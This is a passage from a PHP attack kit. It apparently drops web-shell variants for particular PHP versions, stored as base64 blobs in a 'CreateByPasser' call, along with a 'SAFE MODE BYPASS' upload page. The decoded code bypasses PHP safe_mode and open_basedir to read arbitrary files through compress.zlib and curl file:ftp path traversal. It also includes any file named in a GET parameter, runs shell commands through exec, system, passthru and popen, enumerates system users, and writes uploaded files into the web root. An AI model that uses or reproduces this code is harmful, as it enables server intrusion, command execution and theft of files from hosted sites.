PGZvbnQgY29sb3I9XCJncmVlblwiPk9GRiAobm90IHNlY3VyZSk8L2ZvbnQ+Ijt9
CmVjaG8oIlNhZmUtbW9kZTogJGhzYWZlbW9kZSIpOwokdiA9IEBpbmlfZ2V0KCJv
cGVuX2Jhc2VkaXIiKTsKaWYgKCR2IG9yIHN0cnRvbG93ZXIoJHYpID09ICJvbiIp
IHskb3BlbmJhc2VkaXIgPSB0cnVlOyAkaG9wZW5iYXNlZGlyID0gIjxmb250IGNv
bG9yPVwicmVkXCI+Ii4kdi4iPC9mb250PiI7fQplbHNlIHskb3BlbmJhc2VkaXIg
PSBmYWxzZTsgJGhvcGVuYmFzZWRpciA9ICI8Zm9udCBjb2xvcj1cImdyZWVuXCI+
T0ZGIChub3Qgc2VjdXJlKTwvZm9udD4iO30KZWNobygiPGJyPiIpOwplY2hvKCJP
cGVuIGJhc2UgZGlyOiAkaG9wZW5iYXNlZGlyIik7CmVjaG8oIjxicj4iKTsKZWNo
byAiRGlzYWJsZSBmdW5jdGlvbnMgOiA8Yj4iOwppZignJz09KCRkZj1AaW5pX2dl
dCgnZGlzYWJsZV9mdW5jdGlvbnMnKSkpe2VjaG8gIjxmb250IGNvbG9yPWdyZWVu
Pk5PTkU8L2ZvbnQ+PC9iPiI7fWVsc2V7ZWNobyAiPGZvbnQgY29sb3I9cmVkPiRk
ZjwvZm9udD48L2I+Ijt9CiRmcmVlID0gQGRpc2tmcmVlc3BhY2UoJGRpcik7Cmlm
ICghJGZyZWUpIHskZnJlZSA9IDA7fQokYWxsID0gQGRpc2tfdG90YWxfc3BhY2Uo
JGRpcik7CmlmICghJGFsbCkgeyRhbGwgPSAwO30KJHVzZWQgPSAkYWxsLSRmcmVl
OwokdXNlZF9wZXJjZW50ID0gQHJvdW5kKDEwMC8oJGFsbC8kZnJlZSksMik7CmVj
aG8gIjxQUkU+XG4iOwppZihlbXB0eSgkZmlsZSkpewppZihlbXB0eSgkX0dFVFsn
ZmlsZSddKSl7CmlmKGVtcHR5KCRfUE9TVFsnZmlsZSddKSl7CmRpZSgiXG5XZWxj
b21lLi4gQnkgVGhpcyBzY3JpcHQgeW91IGNhbiBqdW1wIGluIHRoZSAoU2FmZSBN
b2RlPU9OKSAuLiBFbmpveVxuIDxCPjxDRU5URVI+PEZPTlQKQ09MT1I9XCJSRURc
Ij5QSFAgRW1wZXJvcgp4YjVAaG90bWFpbC5jb208L0ZPTlQ+PC9DRU5URVI+PC9C
PiIpOwp9IGVsc2UgewokZmlsZT0kX1BPU1RbJ2ZpbGUnXTsKfQp9IGVsc2Ugewok
ZmlsZT0kX0dFVFsnZmlsZSddOwp9Cn0KJHRlbXA9dGVtcG5hbSgkdHltY3phcywg
ImN4Iik7CmlmKGNvcHkoImNvbXByZXNzLnpsaWI6Ly8iLiRmaWxlLCAkdGVtcCkp
ewokenJvZGxvID0gZm9wZW4oJHRlbXAsICJyIik7CiR0ZWtzdCA9IGZyZWFkKCR6
cm9kbG8sIGZpbGVzaXplKCR0ZW1wKSk7CmZjbG9zZSgkenJvZGxvKTsKZWNobyAi
PEI+LS0tIFN0YXJ0IEZpbGUgIi5odG1sc3BlY2lhbGNoYXJzKCRmaWxlKS4iCi0t
LS0tLS0tLS0tLS08L0I+XG4iLmh0bWxzcGVjaWFsY2hhcnMoJHRla3N0KS4iXG48
Qj4tLS0gRW5kIEZpbGUKIi5odG1sc3BlY2lhbGNoYXJzKCRmaWxlKS4iIC0tLS0t
LS0tLS0tLS0tLVxuIjsKdW5saW5rKCR0ZW1wKTsKZGllKCJcbjxGT05UIENPTE9S
PVwiUkVEXCI+PEI+RmlsZQoiLmh0bWxzcGVjaWFsY2hhcnMoJGZpbGUpLiIgaGFz
IGJlZW4gYWxyZWFkeSBsb2FkZWQuIFBIUCBFbXBlcm9yIDx4YjVAaG90bWFpbC5j
b20+CjtdPC9CPjwvRk9OVD4iKTsKfSBlbHNlIHsKZGllKCI8Rk9OVCBDT0xPUj1c
IlJFRFwiPjxDRU5URVI+U29ycnkuLi4gRmlsZQo8Qj4iLmh0bWxzcGVjaWFsY2hh
cnMoJGZpbGUpLiI8L0I+IGRvc2VuJ3QgZXhpc3RzIG9yIHlvdSBkb24ndCBoYXZl
CmFjY2Vzcy48L0NFTlRFUj48L0ZPTlQ+Iik7Cn0KPz4=');
break;
case '5.2.5' :
CreateByPasser('PD9waHAKaWYgKCRfR0VUWyd4J10pIHsgaW5jbHVkZSgkX0dFVFsneCddKTsgfQpp
ZiAoJF9QT1NUWydjeGMnXT09J2Rvd24nKSB7CmhlYWRlcigiQ29udGVudC1kaXNw
b3NpdGlvbjogZmlsZW5hbWU9ZGVjb2RlLnR4dCIpOwpoZWFkZXIoIkNvbnRlbnQt
dHlwZTogYXBwbGljYXRpb24vb2N0ZXRzdHJlYW0iKTsKaGVhZGVyKCJQcmFnbWE6
IG5vLWNhY2hlIik7CmhlYWRlcigiRXhwaXJlczogMCIpOwplcnJvcl9yZXBvcnRp
bmcoMCk7CmVjaG8gYmFzZTY0X2RlY29kZSgkX1BPU1RbJ3hDb2QnXSk7CmV4aXQ7
Cn0KPz4KPGh0bWw+CjxoZWFkPgo8dGl0bGU+U2l5YW51ci5QSFAgNS4yLjYgLyA1
LjIuNiBzYWZlX21vZGUgSGFuZGxlciBieXBhc3MgKEJldGEgRnJlZSBFZGl0aW9u
KSAgLSBQb3dlcmVkIEJ5IE1lY1RydXk8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5IGJn
Y29sb3I9IiMwMDAwMDAiPgo8Zm9udCBjb2xvcj1GRjgwMDA+Cjxmb250IGZhY2U9
dmVyZGFuYT4KPD9waHAKaWYgKGVtcHR5KCRfUE9TVFsncGhwaW5mbyddICkpIHsK
CX1lbHNlewoJZWNobyAkcGhwaW5mbz0oIWVyZWdpKCJwaHBpbmZvIiwkZGlzX2Z1
bmMpKSA/IHBocGluZm8oKSA6ICJwaHBpbmZvKCkiOwoJZXhpdDsKfQpmdW5jdGlv
biBnZXRzeXN0ZW0oKQp7cmV0dXJuIHBocF91bmFtZSgncycpLiIgIi5waHBfdW5h
bWUoJ3InKS4iICIucGhwX3VuYW1lKCd2Jyk7fTsgCmZ1bmN0aW9uIHNhZmVfbW9k
ZSgpewppZighJHNhZmVfbW9kZSAmJiBzdHJwb3MoZXgoImVjaG8gYWJjaDBsZCIp
LCJoMGxkIikhPTMpeyRfU0VTU0lPTlsnc2FmZV9tb2RlJ10gPSAxO3JldHVybiAi
PGI+PGZvbnQgY29sb3I9IzgwMDAwMCBmYWNlPVZlcmRhbmE+T048L2ZvbnQ+PC9i
PiI7fWVsc2V7ICAgJF9TRVNTSU9OWydzYWZlX21vZGUnXSA9IDA7cmV0dXJuICI8
Zm9udCBjb2xvcj0jMDA4MDAwPjxiPk9GRjwvYj48L2ZvbnQ+Ijt9Cn07ZnVuY3Rp
b24gZXgoJGluKXsKJG91dCA9ICcnOwppZihmdW5jdGlvbl9leGlzdHMoJ2V4ZWMn
KSl7ZXhlYygkaW4sJG91dCk7JG91dCA9IGpvaW4oIlxuIiwkb3V0KTt9ZWxzZWlm
KGZ1bmN0aW9uX2V4aXN0cygncGFzc3RocnUnKSl7b2Jfc3RhcnQoKTtwYXNzdGhy
dSgkaW4pOyRvdXQgPSBvYl9nZXRfY29udGVudHMoKTtvYl9lbmRfY2xlYW4oKTt9
CmVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3N5c3RlbScpKXtvYl9zdGFydCgpO3N5
c3RlbSgkaW4pOyRvdXQgPSBvYl9nZXRfY29udGVudHMoKTtvYl9lbmRfY2xlYW4o
KTt9CmVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3NoZWxsX2V4ZWMnKSl7JG91dCA9
IHNoZWxsX2V4ZWMoJGluKTt9CmVsc2VpZihpc19yZXNvdXJjZSgkZiA9IHBvcGVu
KCRpbiwiciIpKSl7JG91dCA9ICIiO3doaWxlKCFAZmVvZigkZikpIHsgJG91dCAu
PSBmcmVhZCgkZiwxMDI0KTt9CnBjbG9zZSgkZik7fQpyZXR1cm4gJG91dDt9Cj8+
CiAgPHRyPgogICAgPHRkIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjQzIj4KCiAgICA8
dGFibGUgYm9yZGVyPSIxIiBjZWxscGFkZGluZz0iMCIgY2VsbHNwYWNpbmc9IjAi
IGJvcmRlcmNvbG9yPSIjNTQ1NDU0IiB3aWR0aD0iMTAwJSIgaWQ9IkF1dG9OdW1i
ZXIyIiBiZ2NvbG9yPSIjNDI0MjQyIiBzdHlsZT0iYm9yZGVyLWNvbGxhcHNlOiBj
b2xsYXBzZSI+CiAgICAgIDx0cj4KICAgICAgICA8dGQgd2lkdGg9IjEwMCUiIGJn
Y29sb3I9IiMwMDAwMDAiPgo8L3RkPgogICAgICA8L3RyPgogICAgICA8dHI+CiAg
ICAgICAgPHRkIHdpZHRoPSIxMDAlIiBzdHlsZT0iZm9udC1mYW1pbHk6ICgxKUZv
bnRzNDQtTmV0OyBjb2xvcjogI0ZGMDAwMDsgZm9udC1zaXplOiA4cHQ7IGZvbnQt
d2VpZ2h0OiBib2xkIiBkaXI9Imx0ciI+PGZvbnQgY29sb3I9ZmZmZmZmPktlcm5l
bCA6PC9mb250PiA8P3BocCBlY2hvIEBwaHBfdW5hbWUoKTs/PjwvdGQ+CiAgICAg
IDwvdHI+CiAgICAgIDx0cj4KICAgICAgICA8dGQgd2lkdGg9IjEwMCUiIHN0eWxl
PSJmb250LWZhbWlseTogKDEpRm9udHM0NC1OZXQ7IGNvbG9yOiAjRkYwMDAwOyBm
b250LXNpemU6IDhwdDsgZm9udC13ZWlnaHQ6IGJvbGQiIGRpcj0ibHRyIj48Zm9u
dCBjb2xvcj1mZmZmZmY+U2VydmVyIDo8L2ZvbnQ+IDw/cGhwIGVjaG8gJF9TRVJW
RVJbJ1NFUlZFUl9OQU1FJ107Pz48L3RkPgogICAgICA8L3RyPgogICAgICA8dHI+
CiAgICAgICAgPHRkIHdpZHRoPSIxMDAlIiBzdHlsZT0iZm9udC1mYW1pbHk6ICgx
KUZvbnRzNDQtTmV0OyBjb2xvcjogI0ZGMDAwMDsgZm9udC1zaXplOiA4cHQ7IGZv
bnQtd2VpZ2h0OiBib2xkIiBkaXI9Imx0ciI+PGZvbnQgY29sb3I9ZmZmZmZmPlBI
UCA6PC9mb250PiA8P3BocCBlY2hvIHBocHZlcnNpb24oKTs/PjwvdGQ+CiAgICAg
IDwvdHI+CiAgICAgIDx0cj4KICAgICAgICA8dGQgd2lkdGg9IjEwMCUiIHN0eWxl
PSJmb250LWZhbWlseTogKDEpRm9udHM0NC1OZXQ7IGNvbG9yOiAjRkYwMDAwOyBm
b250LXNpemU6IDhwdDsgZm9udC13ZWlnaHQ6IGJvbGQiIGRpcj0ibHRyIj48Zm9u
dCBjb2xvcj1mZmZmZmY+RGljIDo8L2ZvbnQ+IDw/cGhwIGVjaG8gZ2V0Y3dkKCk7
Pz48L3RkPgogICAgICA8L3RyPgogICAgICA8dHI+CiAgICAgICAgPHRkIHdpZHRo
PSIxMDAlIiBzdHlsZT0iZm9udC1mYW1pbHk6ICgxKUZvbnRzNDQtTmV0OyBjb2xv
cjogI0ZGMDAwMDsgZm9udC1zaXplOiA4cHQ7IGZvbnQtd2VpZ2h0OiBib2xkIiBk
aXI9Imx0ciI+PGZvbnQgY29sb3I9ZmZmZmZmPlNhZmVfTW9kZSA6PC9mb250PiA8
P3BocCBlY2hvIHNhZmVfbW9kZSgpOz8+PC90ZD4KICAgICAgPC90cj4KICAgICAg
PHRyPgogICAgICAgIDx0ZCB3aWR0aD0iMTAwJSIgc3R5bGU9ImZvbnQtZmFtaWx5
OiAoMSlGb250czQ0LU5ldDsgY29sb3I6ICNGRjAwMDA7IGZvbnQtc2l6ZTogOHB0
OyBmb250LXdlaWdodDogYm9sZCIgZGlyPSJsdHIiPjxmb250IGNvbG9yPWZmZmZm
Zj5Tb2Z0d2FyZSA6PC9mb250PiA8P3BocCBlY2hvIGdldGVudigiU0VSVkVSX1NP
RlRXQVJFIik7Pz48L3RkPgogICAgICA8L3RyPgogICAgICA8dHI+CiAgICAgICAg
PHRkIHdpZHRoPSIxMDAlIiBzdHlsZT0iZm9udC1mYW1pbHk6ICgxKUZvbnRzNDQt
TmV0OyBjb2xvcjogI0ZGMDAwMDsgZm9udC1zaXplOiA4cHQ7IGZvbnQtd2VpZ2h0
OiBib2xkIiBkaXI9Imx0ciI+PGZvbnQgY29sb3I9ZmZmZmZmPmlEIDo8L2ZvbnQ+
IDw/cGhwIGVjaG8gc3lzdGVtKGlkKTs/PjwvdGQ+CiAgICAgIDwvdHI+CiAgICAg
IDx0cj4KICAgICAgICA8dGQgd2lkdGg9IjEwMCUiIHN0eWxlPSJmb250LWZhbWls
eTogKDEpRm9udHM0NC1OZXQ7IGNvbG9yOiAjRkYwMDAwOyBmb250LXNpemU6IDhw
dDsgZm9udC13ZWlnaHQ6IGJvbGQiIGRpcj0ibHRyIj48Zm9udCBjb2xvcj1mZmZm
ZmY+QzBubmVjdCA/IDo8L2ZvbnQ+IDw/cGhwIGVjaG8gKCRfU0VSVkVSWydIVFRQ
X0NPTk5FQ1RJT04nXSk7Pz4gICA8Zm9udCBjb2xvcj1mZmZmZmY+UG9ydCA6PC9m
b250PiA8P3BocCBlY2hvICgiOiIuJF9TRVJWRVJbIlNFUlZFUl9QT1JUIl0pOz8+
ICA8L3RkPgogICAgICA8L3RyPgogICAgICA8dHI+CiAgICAgICAgPHRkIHdpZHRo
PSIxMDAlIiBzdHlsZT0iZm9udC1mYW1pbHk6ICgxKUZvbnRzNDQtTmV0OyBjb2xv
cjogI0ZGMDAwMDsgZm9udC1zaXplOiA4cHQ7IGZvbnQtd2VpZ2h0OiBib2xkIiBk
aXI9Imx0ciI+PGZvbnQgY29sb3I9ZmZmZmZmPllvdXIgQWdlbnQgOjwvZm9udD4g
PD9waHAgZWNobyAoJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKTs/PiAgIDxm
b250IGNvbG9yPWZmZmZmZj5Zb3VyIGlwIGluZm8gOjwvZm9udD4gPD9waHAgZWNo
byAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10pOz8+ICAgTXlTUUw6IDwvdGQ+CiAg
ICAgIDwvdHI+CiAgICAgIDx0cj4KICAgICAgICA8dGQgd2lkdGg9IjEwMCUiIHN0
eWxlPSJmb250LWZhbWlseTogKDEpRm9udHM0NC1OZXQ7IGNvbG9yOiAjRkYwMDAw
OyBmb250LXNpemU6IDhwdDsgZm9udC13ZWlnaHQ6IGJvbGQiIGRpcj0ibHRyIj48
Zm9udCBjb2xvcj1mZmZmZmY+UHJvdG9rb2wgOjwvZm9udD4gPD9waHAgZWNobyAo
JF9TRVJWRVJbIlNFUlZFUl9QUk9UT0NPTCJdKTs/PiAgIDxmb250IGNvbG9yPWZm
ZmZmZj5DaGFyc2V0IDo8L2ZvbnQ+IDw/cGhwIGVjaG8gKCRfU0VSVkVSWydIVFRQ
X0FDQ0VQVF9DSEFSU0VUJ10pOz8+ICAgPGZvbnQgY29sb3I9ZmZmZmZmPkVuY29k
aW5nIDo8L2ZvbnQ+IDw/cGhwIGVjaG8gKCRfU0VSVkVSWydIVFRQX0FDQ0VQVF9F
TkNPRElORyddKTs/PiAgIDxmb250IGNvbG9yPWZmZmZmZj5MYW5nIDo8L2ZvbnQ+
IDw/cGhwIGVjaG8gKCRfU0VSVkVSWydIVFRQX0FDQ0VQVF9MQU5HVUFHRSddKTs/
PjwvdGQ+CiAgICAgIDwvdHI+CiAgICAgIDx0cj4KICAgICAgPC90cj4KICAgIDwv
dGFibGU+CiAgICA8L3RkPgogIDwvdHI+CiAgPHRyPgogICAgPHRkIHdpZHRoPSIx
MDAlIiBoZWlnaHQ9IjEiPjw/cGhwCmlmIChlbXB0eSgkX1BPU1RbJ3ozciddKSl7
CgkKCWVjaG8gJzxmb3JtIG1ldGhvZD0iUE9TVCI+JzsKCWVjaG8gJzxpbnB1dCB0
eXBlPSJ0ZXh0IiBuYW1lPSJ6M3IiIHNpemU9IjUwIiB2YWx1ZT0iL2hvbWUvaGVk
ZWZ1c2VyL3B1YmxpY19odG1sL2luZGV4LnBocCI+JzsKCWVjaG8gJzxpbnB1dCB0
eXBlPSJzdWJtaXQiIHZhbHVlPSJFbmNvZGUiPic7CgllY2hvICc8L2Zvcm0+JzsK
fWVsc2V7CgkkYjRzZTY0ID0kX1BPU1RbJ3ozciddOwoJJGhlbm8gPWJhc2U2NF9l
bmNvZGUoJGI0c2U2NCk7CgllY2hvICc8cCBhbGlnbj0iY2VudGVyIj4nOwoJZWNo
byAnPHRleHRhcmVhIG1ldGhvZD0iUE9TVCIgcm93cz0iMSIgY29scz0iODAiIHdy
YXI9Im9mZiI+JzsKCXByaW50ICRoZW5vOwoJZWNobyAnPC90ZXh0YXJlYT4nOwp9
CgllY2hvICc8Zm9ybSBtZXRob2Q9InBvc3QiIC8+PGlucHV0IHR5cGU9InRleHQi
IG5hbWU9ImN6IiBzaXplPSI1MCIgdmFsdWU9IkVuY29kZSBlZGlsbWkPIGtvZCBi
dXJheWEuLiIgLz48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iT0sgISEiIC8+
PHNlbGVjdCBuYW1lPWRlYz48b3B0aW9uIHZhbHVlPXNob3c+T2t1PC9vcHRpb24+
PG9wdGlvbiB2YWx1ZT1kZWNvZGU+RGUkaWZyZTwvb3B0aW9uPjwvc2VsZWN0Pjwv
Zm9ybT4nOwoKCWlmKCAhZW1wdHkoJF9QT1NUWydjeiddKSApCgkJaWYgKCRkZWM9
PSdkZWNvZGUnKXtlY2hvICI8Zm9ybSBuYW1lPWZvcm0gbWV0aG9kPVBPU1Q+Ijt9
CgkJZWNobyAiPHAgYWxpZ249bGVmdD48dGV4dGFyZWEgbWV0aG9kPSdQT1NUJyBu
YW1lPSd4Q29kJyBjb2xzPSc2MCcgcm93cz0nMjUnIHdyYXI9J29mZicgPiI7CgkJ
CSRzcz0kX1BPU1RbJ2N6J107CgkJCSRmaWxlID0gYmFzZTY0X2RlY29kZSgkc3Mp
OwoJCQkJCWlmKChjdXJsX2V4ZWMoY3VybF9pbml0KCJmaWxlOmZ0cDovLy4uLy4u
Ly4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4u
Ly4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLyIu
JGZpbGUpKSkgYU5kIGVtcHRZKCRmaWxlKSkKCQkJCgkJCQlpZiAoJF9QT1NUWydk
ZWMnXT09J2RlY29kZScpe2VjaG8gYmFzZTY0X2VuY29kZSgkX1BPU1RbJ3hDb2Qn
XSk7fQplY2hvICI8L3RleHRhcmVhPjwvcD4iOwo/PjwvdGQ+CiAgPC90cj4KICA8
dHI+CiAgICA8dGQgd2lkdGg9IjEwMCUiIHN0eWxlPSJmb250LWZhbWlseTogKDEp
Rm9udHM0NC1OZXQ7IGNvbG9yOiAjRkZGRkZGOyBmb250LXNpemU6IDhwdDsgZm9u
dC13ZWlnaHQ6IGJvbGQiIGhlaWdodD0iMTMiPjw/cGhwIGlmICgkZGVjPT0nZGVj
b2RlJyl7IGVjaG8gIjxwIGFsaWduPWNlbnRlcj48aW5wdXQgdHlwZT1oaWRkZW4g
bmFtZT1jeGMgdmFsdWU9J2Rvd24nPjxpbnB1dCB0eXBlPXN1Ym1pdCBuYW1lPXN1
Ym1pdCB2YWx1ZT0nRG93bkxvYWQnPjwvcD48L2Zvcm0+IjsgfSA/PjwvdGQ+CiAg
PC90cj4KICA8dHI+CiAgICA8dGQgd2lkdGg9IjEwMCUiIHN0eWxlPSJmb250LWZh
bWlseTogKDEpRm9udHM0NC1OZXQ7IGNvbG9yOiAjRkZGRkZGOyBmb250LXNpemU6
IDhwdDsgZm9udC13ZWlnaHQ6IGJvbGQiIGhlaWdodD0iMTMiPgogICAgPHAgYWxp
Z249ImxlZnQiPjxmb250IHNpemU9IjEiPlNpeWFudXIuUEhQIDwvZm9udD4gPGEg
aHJlZj0iaHR0cDovL3d3dy5pbWhhdGltaS5vcmciPgogICAgPGZvbnQgc2l6ZT0i
MSIgY29sb3I9IiM4QjhCOEIiPnd3dy5pbWhhdGltaS5vcmc8L2ZvbnQ+PC9hPiAg
IDxhIGhyZWY9Imh0dHA6Ly93d3cuc3B5aGFja2Vyei5jb20iPgogICAgPGZvbnQg
c2l6ZT0iMSIgY29sb3I9IiM4QjhCOEIiPnd3dy5zcHloYWNrZXJ6LmNvbTwvZm9u
dD48L2E+PC90ZD4KICA8L3RyPgogIDx0cj4KICAgIDx0ZCB3aWR0aD0iMTAwJSIg
c3R5bGU9ImZvbnQtZmFtaWx5OiAoMSlGb250czQ0LU5ldDsgY29sb3I6ICNGRkZG
RkY7IGZvbnQtc2l6ZTogOHB0OyBmb250LXdlaWdodDogYm9sZCIgaGVpZ2h0PSIx
MyI+CiAgICA8cCBhbGlnbj0ibGVmdCI+IDxmb250IHNpemU9IjEiPkNvZGVkIEJ5
IE1lY1RydXk8L2ZvbnQ+PC90ZD4KICA8L3RyPgo8L3RhYmxlPgogIDwvY2VudGVy
Pgo8L2Rpdj4KPC9ib2R5Pgo8L2h0bWw+');
$Version = @phpversion();
$fileS = base64_decode("PGh0bWwgZGlyPSJsdHIiPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVu
dC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiPgo8dGl0
bGU+U0FGRSBNT0RFIEJZUEFTUzwvdGl0bGU+CjxzdHlsZSB0eXBlPSJ0ZXh0L2Nz
cyIgbWVkaWE9InNjcmVlbiI+CmJvZHkgewoJZm9udC1zaXplOiAxMHB4OwoJZm9u
dC1mYW1pbHk6IHZlcmRhbmE7Cn0KSU5QVVQgewoJQk9SREVSLVRPUC1XSURUSDog
MXB4OyBGT05ULVdFSUdIVDogYm9sZDsgQk9SREVSLUxFRlQtV0lEVEg6IDFweDsg
Rk9OVC1TSVpFOiAxMHB4OyBCT1JERVItTEVGVC1DT0xPUjogI0Q1MDQyODsgQkFD
S0dST1VORDogIzU5MDAwOTsgQk9SREVSLUJPVFRPTS1XSURUSDogMXB4OyBCT1JE
RVItQk9UVE9NLUNPTE9SOiAjRDUwNDI4OyBDT0xPUjogIzAwZmYwMDsgQk9SREVS
LVRPUC1DT0xPUjogI0Q1MDQyODsgRk9OVC1GQU1JTFk6IHZlcmRhbmE7IEJPUkRF
Ui1SSUdIVC1XSURUSDogMXB4OyBCT1JERVItUklHSFQtQ09MT1I6ICNENTA0MjgK
fQo8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5IGRpcj0ibHRyIiBhbGluaz0iIzAwZmYw
MCIgIGJnY29sb3I9IiMwMDAwMDAiIGxpbms9IiMwMGMwMDAiIHRleHQ9IiMwMDgw
MDAiIHZsaW5rPSIjMDBjMDAwIj4KPGZvcm0gbWV0aG9kPSJQT1NUIiBlbmN0eXBl
PSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBhY3Rpb249Ij8iPgpFbnRlciBUaGUgPEEg
aHJlZj0nP2luZm89MScgPiBUYXJnZXQgUGF0aCA8L0E+OjxCUj48QlI+CjxpbnB1
dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ0YXJnZXQiIHZhbHVlPSI8P3BocCBlY2hvICRf
U0VSVkVSWydET0NVTUVOVF9ST09UJ107ID8+IiBzaXplPSI1MCI+PEJSPipUYXJn
ZXQgbXVzdCBiZSB3cml0ZWFibGUhPEJSPjxCUj4KRmlsZSBDb250ZW50OjxCUj48
QlI+CjxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJGMSIgc2l6ZT0iNTAiPjxCUj48
QlI+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9IlVwbG9hZCIgdmFsdWU9IlVw
bG9hZCI+CjwvZm9ybT4KPD9waHAKZXJyb3JfcmVwb3J0aW5nKEVfQUxMIF4gRV9O
T1RJQ0UpOwoKaWYoaXNzZXQoJF9HRVRbJ2luZm8nXSkgJiYgJF9HRVRbJ2luZm8n
XSA9PSAxKQp7CglpZiAoZnVuY3Rpb25fZXhpc3RzKCdwb3NpeF9nZXRwd3VpZCcp
KQoJewoJCWlmIChpc3NldCgkX1BPU1RbJ2YnXSkgJiYgaXNzZXQoJF9QT1NUWyds
J10pKQoJCXsKCQkJJGYgPSBpbnR2YWwoJF9QT1NUWydmJ10pOwoJCQkkbCA9IGlu
dHZhbCgkX1BPU1RbJ2wnXSk7CgkJCXdoaWxlICgkZiA8ICRsKQoJCQl7CgkJCQkk
dWlkID0gcG9zaXhfZ2V0cHd1aWQoJGYpOwoJCQkJaWYgKCR1aWQpCgkJCQl7CgkJ
CQkJJHVpZFsiZGlyIl0gPSAiPGEgaHJlZj1cIlwiPiIuJHVpZFsiZGlyIl0uIjwv
YT4iOwoJCQkJCWVjaG8gam9pbigiOiIsJHVpZCkuIjxicj4iOwoJCQkJfQoJCQkJ
JGYrKzsKCQkJfQoJCX0gZWxzZQoJCXsKCQkJZWNobyAnCgkJCTxmb3JtIG1ldGhv
ZD0iUE9TVCIgYWN0aW9uPSI/aW5mbz0xIj5VaWQgIAoJCQlGUk9NIDogPGlucHV0
IHR5cGU9InRleHQiIG5hbWU9ImYiIHZhbHVlPSIxIiBzaXplPSI0Ij4KCQkJVE8g
OiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0ibCIgdmFsdWU9IjEwMDAiIHNpemU9
IjQiPgoJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJTaG93IiB2YWx1ZT0i
U2hvdyI+JzsKCQl9Cgl9IGVsc2UgZGllKCJTb3JyeSEgUG9zaXggRnVuY3Rpb25z
IGFyZSBkaXNhYmxlZCBpbiB5b3VyIGJveCwgVGhlcmUgaXMgbm8gd2F5IHRvIG9i
dGFpbiB1c2VycyBwYXRoISBZb3UgbXVzdCBlbnRlciBpdCBtYW51YWxseSEiKTsK
CWRpZSgpOwp9CgppZihpc3NldCgkX1BPU1RbJ1VwbG9hZCddKSAmJiBpc3NldCgk
X1BPU1RbJ3RhcmdldCddKSAmJiAkX1BPU1RbJ3RhcmdldCddICE9ICIiKQp7Cgkk
TXlVaWQgICA9IGdldG15dWlkKCk7CgkkTXlVbmFtZSA9IGdldF9jdXJyZW50X3Vz
ZXIoKTsKCWlmIChmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGV1aWQnKSkKCXsK
CQkkSHR0cGRVaWQgICA9IHBvc2l4X2dldGV1aWQoKTsKCQkkSHR0cGRJbmZvICA9
IHBvc2l4X2dldHB3dWlkKCRIdHRwZFVpZCk7CgkJJEh0dHBkVW5hbWUgPSAiKCIu
JEh0dHBkSW5mb1snbmFtZSddLiIpIjsKCX0gZWxzZQoJewoJCSROZXdTY3JpcHQg
PSBAZm9wZW4oJ2J5cGFzcy5waHAnLCd3KycpOwoJCWlmICghJE5ld1NjcmlwdCkK
CQl7CgkJCWRpZSgnTWFrZSB0aGUgQ3VycmVudCBkaXJlY3RvcnkgV3JpdGVhYmxl
IChDaG1vZCA3NzcpIGFuZCB0cnkgYWdhaW4nKTsKCQl9IGVsc2UgICRIdHRwZFVp
ZCA9IGZpbGVvd25lcignYnlwYXNzLnBocCcpOwoJfQoKCWlmICgkTXlVaWQgIT0g
JEh0dHBkVWlkKQoJewoJCWVjaG8gIlRoaXMgU2NyaXB0IFVzZXIgKCRNeVVpZCkg
YW5kIGh0dHBkIFByb2Nlc3MgVXNlciAoJEh0dHBkVWlkKSBkb250IG1hdGNoISI7
CgkJZWNobyAiIFdlIFdpbGwgY3JlYXRlIGEgY29weSBvZiB0aGlzIFNjcmlwdCB3
aXRoIGh0dHBkIFVzZXIgJEh0dHBkVW5hbWUKCQlpbiBjdXJyZW50IGRpcmVjdG9y
eS4uLiIuIjxCUj4iOwoJCWlmICghJE5ld1NjcmlwdCkKCQl7CgkJCSROZXdTY3Jp
cHQgPSBAZm9wZW4oJ2J5cGFzcy5waHAnLCd3KycpOwoJCQlpZiAoISROZXdTY3Jp
cHQpCgkJCXsKCQkJCWRpZSgnTWFrZSB0aGUgQ3VycmVudCBkaXJlY3RvcnkgV3Jp
dGVhYmxlIChDaG1vZCA3NzcpIGFuZCB0cnkgYWdhaW4nKTsKCQkJfQoJCX0KCQkk
VGVtcCA9IGZvcGVuKF9fRklMRV9fICwncicpOwoJCXdoaWxlICghZmVvZigkVGVt
cCkpCgkJewoJCQkkQnVmZmVyID0gZmdldHMoJFRlbXApOwoJCQlmd3JpdGUoJE5l
d1NjcmlwdCwkQnVmZmVyKTsKCQl9CgkJZmNsb3NlKCRUZW1wKTsKCQlmY2xvc2Uo
JE5ld1NjcmlwdCk7CgkJZWNobyAiUGxlYXNlIFJ1biA8QSBocmVmPSdieXBhc3Mu
cGhwJz4gVGhpcyA8L0E+IFNjcmlwdCI7CgkJZGllKCk7CQoJfQoJCgkkVGFyZ2V0
UGF0aCA9IHRyaW0oJF9QT1NUWyd0YXJnZXQnXSk7CgkkVGFyZ2V0RmlsZSA9IHRl
bXBuYW0oJFRhcmdldFBhdGgsIkJQIik7CglpZiAoc3Ryc3RyKCRUYXJnZXRGaWxl
LCAkVGFyZ2V0UGF0aCkgPT0gVFJVRSkKCXsKCQllY2hvICRUYXJnZXRGaWxlLiIg
U3VjY2Vzc2Z1bGx5IGNyZWF0ZWQhPEJSPiI7Cgl9IGVsc2UgZGllKCIkVGFyZ2V0
